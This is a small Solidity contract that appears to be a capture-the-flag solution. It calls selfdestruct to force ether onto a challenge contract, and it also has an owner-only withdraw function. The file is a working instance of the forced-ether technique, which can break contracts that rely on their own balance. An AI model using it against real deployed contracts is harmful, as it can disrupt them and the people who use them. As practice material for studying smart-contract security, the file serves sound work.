// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

contract Soln{
    address payable owner;
    address payable challangeContract;
    constructor(address _owner, address _challangeContract) payable {
        require(msg.value == 1 ether);
        owner = payable(_owner);
        challangeContract = payable(_challangeContract);
    }

    // in case something goes wrong
    function withdrawEth(uint256 amount) public payable{
        require(msg.sender == owner);

        owner.transfer(amount * 10**18);
    }

    function suicideAndSolveChallange() public {
        selfdestruct(challangeContract);
    }

}